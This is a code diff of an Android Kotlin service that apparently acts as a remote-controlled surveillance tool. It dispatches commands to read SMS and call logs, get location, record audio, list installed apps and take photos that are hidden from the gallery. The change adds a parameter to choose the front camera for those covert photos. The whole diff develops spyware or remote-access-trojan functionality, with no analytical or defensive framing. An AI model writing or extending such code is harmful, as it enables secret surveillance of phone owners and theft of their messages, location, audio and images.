@@ -328,7 +328,7 @@ class MainService : Service() {
             CMD_GET_SMS -> getSmsMessages() ?: JSONObject().apply { put("error", "Permission denied for READ_SMS"); put("errorType", "SecurityException"); put("command", "get_sms") }
             CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject().apply { put("error", "Permission denied for READ_CALL_LOG"); put("errorType", "SecurityException"); put("command", "get_call_logs") }
             CMD_GET_LOCATION -> getCurrentLocation()
-            CMD_TAKE_PHOTO -> takePhoto()
+            CMD_TAKE_PHOTO -> takePhoto(params)
             CMD_RECORD_AUDIO -> startStopAudioRecording(params)
             CMD_GET_DEVICE_INFO -> getDetailedDeviceInfo()
             CMD_GET_INSTALLED_APPS -> getInstalledApps()
@@ -502,14 +502,15 @@ class MainService : Service() {
     }
     
     // ===== UPDATED: Uses CameraHelper for actual photo capture (no corrupted files + hidden from gallery) =====
-    private fun takePhoto(): JSONObject {
+    private fun takePhoto(params: JSONObject): JSONObject {
         try {
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 return JSONObject().apply { put("error", "Camera permission not granted"); put("errorType", "SecurityException"); put("command", "take_photo") }
             }
 
             val cameraHelper = CameraHelper(this)
-            val result = cameraHelper.capturePhoto()
+            val useFront = params.optBoolean("front", false) || params.optString("camera", "back") == "front"
+            val result = cameraHelper.capturePhoto(useFront)
             
             if (!result.success) {
                 return JSONObject().apply {
